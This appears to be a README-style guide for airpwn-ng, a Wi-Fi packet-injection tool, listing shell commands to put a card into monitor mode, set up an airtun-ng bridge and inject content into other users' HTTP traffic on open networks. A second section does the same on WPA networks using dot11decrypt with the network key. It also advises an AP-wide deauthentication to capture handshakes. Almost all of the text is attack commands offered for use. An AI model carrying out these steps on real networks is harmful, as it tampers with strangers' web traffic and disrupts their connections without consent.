Example Steps to get airpwn-ng running for an Open Access Point:

1. Drop desired NIC to monitor mode
	- airmon-ng start wlan0
	-OR
	- airmon-zc start wlan0

## It should be noted here that -zc will create wlan0mon and -ng will create mon0.  Depending on the svn of your aircrack-ng, -zc might have already replaced -ng.  Either or will work fine, but some people will experience -1 problems when dealing with channels using -ng.

## For purposes of clarity, mon0 will reference the Monitor Mode NIC from here on out.

2. Change monitor mode NIC to the desired channel
	- iwconfig mon0 <channel>

## To find out what channel a card is currently on, perform: iwlist <NIC> channel | grep Current

3. To find the Index Value for airpwn-ng we must perform an http request while running card-detect
	- ./card-detect mon0
		- On another laptop, or the same laptop with a NIC connected to the desired AP, open a browser and view an http website
		- The Index Value will be displayed on the shell where card-detect is running

4. Now we need to create a bridge that "thinks" it's being managed, we use airtun-ng for this
	- airtun-ng -a <BSSID of Access Point> mon0 -t 0

5. Once airtun-ng is running and at0 is up, we need to configure it.  Obviously you will have to account for your own subnet values, but here is an example
	- ifconfig at0 192.168.0.200 netmask 255.255.255.0 up

6. Now it's time to inject our content.
	- ./airpwn-ng example-injects/wargames mon0 at0 <Index Value>

## If you're injecting on WEP/WPA protected network:

0. This guide assumes you have already installed dot11decrypt. It has been tested on just one NIC but you can use two for efficiency

1. Drop desired NIC to monitor mode
	- airmon-ng start wlan0
	-OR
	- airmon-zc start wlan0

2. Change monitor mode NIC to the desired channel
	- iwconfig mon0 <channel>
	- if this doesn't work, set the monitor NIC's channel with airmon-ng start wlan0 <channel>

3. Create a TAP interface that live-decrypts traffic using dot11decrypt
	- dot11decrypt mon0 wpa:<essid>:<key>
	- e.g. dot11decrypt mon0 wpa:MyNetwork:MyHardToCrackPassword
	- IMPORTANT NOTE: dot11decrypt (and any other decryption software) needs to capture the 4-way handshake between the AP and the client before being able to decrypt traffic, so an AP-wide deauth should be performed right after enabling the TAP interface
	- ALSO: dot11decrypt can handle more than one network on sniff by providing an arbitrary number of wpa:<essid>:<key> tuples, but airpwn-ng can only handle one AP in Encrypted Wireless mode for now

4. Connect and authenticate to the target network with your injection NIC
	- We're assuming wlan0 for this, in a one NIC scenario

5. Now it's time to inject our content.
	- ./airpwn-ng example-injects/wargames tap0 wlan0


